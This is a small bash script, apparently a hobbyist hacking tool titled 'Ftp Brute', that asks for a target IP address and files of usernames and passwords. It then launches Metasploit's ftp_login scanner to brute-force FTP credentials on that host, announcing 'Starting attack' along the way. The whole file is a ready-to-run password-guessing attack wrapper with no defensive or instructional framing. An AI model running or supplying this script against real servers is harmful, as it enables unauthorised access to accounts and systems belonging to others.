#!/bin/bash
# Author : SAEP
clear
kirmizi="\e[31m"
yesil="\e[32m"
sari="\e[33m"
mor="\e[34m"
mavi="\e[36m"
beyaz="\033[1;37m"
reset="\e[0m"
author="\e[33mAuthor : \e[31mSAEP\e[32m  OFFİCİALL \e[31mV1.0\e[0m"

printf "\n"
printf "\n"
printf "$kirmizi    ________           ____             __ $reset \n"
printf "$kirmizi   / ____/ /_____     / __ )_______  __/ /____ $reset \n"
printf "$kirmizi  / /_  / __/ __ \   / __  / ___/ / / / __/ _ \ $reset \n"
printf "$kirmizi / __/ / /_/ /_/ /  / /_/ / /  / /_/ / /_/  __/ $reset \n"
printf "$kirmizi/_/    \__/ .___/  /_____/_/   \__,_/\__/\___/ $reset \n"
printf "$kirmizi          /_/ $reset \n"
printf "\n"
printf "\n"
printf "$author $reset"
printf "\n"
read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" RHOST address : "$kirmizi)" ip
sleep 1
printf "\n"
read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of users : "$kirmizi)" listuser
printf "\n"
sleep 1
read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of passwords : "$kirmizi) " listpass
printf "\n"
printf $" --->$sari Necessary actions are being taken...\n"
sleep 2
echo ""
printf " $kirmizi[$yesil+$kirmizi]$yesil List of users: $listuser\n"
sleep 1
printf " $kirmizi[$yesil+$kirmizi]$yesil List of passwords: $listpass\n"
sleep 2
clear
printf "\n"
printf $" --->$sari Starting attack on $ip address\n"
printf "\n"
sleep 3
msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS $ip ; set USER_FILE $listuser ; set PASS_FILE $listpass ; exploit ; "
